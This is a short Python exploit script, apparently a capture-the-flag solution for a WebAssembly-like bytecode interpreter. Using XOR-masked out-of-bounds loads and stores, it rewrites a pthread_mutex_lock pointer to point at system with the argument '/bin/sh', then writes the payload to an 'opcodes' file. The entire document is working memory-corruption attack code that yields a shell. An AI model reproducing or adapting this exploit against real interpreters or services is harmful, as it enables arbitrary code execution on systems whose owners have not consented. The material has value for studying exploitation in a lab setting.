import struct

p16=lambda x: struct.pack("<H", x)
p32=lambda x: struct.pack("<L", x)
p64=lambda x: struct.pack("<Q", x)

pthread_mutex_lock = 0x00007ffff7c4ffc0
system = 0x7ffff7e0b410

ld=0x6a5ff0 - 0x18
func=ld+0x2ef68
arg=ld+0x2e968
xor=0x414141

base = 0x1544d0
opcodes = [
	# i32.const [func - base]
	p64(46), p64((func-base)^xor),
	p64(46), p64(xor), p64(96),

	# push(func)
	# i32.const [func - base]
	p64(46), p64((func-base)^xor),
	p64(46), p64(xor), p64(96),
	# i64.load
	p64(22), p64(0),

	# func -= delta
	# i64.const
	p64(47), p64(pthread_mutex_lock - system & (2 ** 64 - 1)),
	# i64.sub
	p64(106),

	# i64.store
	p64(36), p64(0),

	# arg = command
	p64(46), p64((arg - base)^xor),
	p64(46), p64(xor), p64(96),
	p64(47), b'/bin/sh\x00',
	p64(36), p64(0),

	p64(0) # unreachable, exit
]
open('opcodes','wb').write(b''.join(opcodes))